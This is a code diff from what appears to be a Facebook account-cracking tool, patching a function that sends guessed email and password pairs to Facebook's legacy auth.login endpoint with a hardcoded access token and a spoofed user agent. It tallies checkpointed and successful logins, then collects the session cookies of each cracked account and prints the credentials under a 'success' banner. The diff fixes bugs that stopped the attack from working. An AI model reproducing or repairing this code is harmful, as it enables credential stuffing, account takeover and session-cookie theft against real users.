@@ -1566,8 +1566,8 @@ def b_api(idf, pwv):
         try:
             if 'ya' in ualuh: ua = ualu[0]
             url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-            # req = urllib.request.Request(url, headers={'User-Agent': ua})
-            data = urllib.request.urlopen(url)
+            req = urllib.request.Request(url, headers={'User-Agent': ua})
+            data = urllib.request.urlopen(req)
             fannn = json.load(data)
             if 'User must verify their account' in fannn['error_msg']:
                 cp += 1
@@ -1580,7 +1580,7 @@ def b_api(idf, pwv):
                 break
             elif "access_token" in fannn:
                 ok += 1
-                fannnnnn_cookies = sorted(q["session_cookies"], key=lambda x: (x["name"] != "datr", x["name"]))
+                fannnnnn_cookies = sorted(fannn["session_cookies"], key=lambda x: (x["name"] != "datr", x["name"]))
                 kuki = ";".join(i["name"] + "=" + i["value"] for i in fannnnnn_cookies)
                 tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
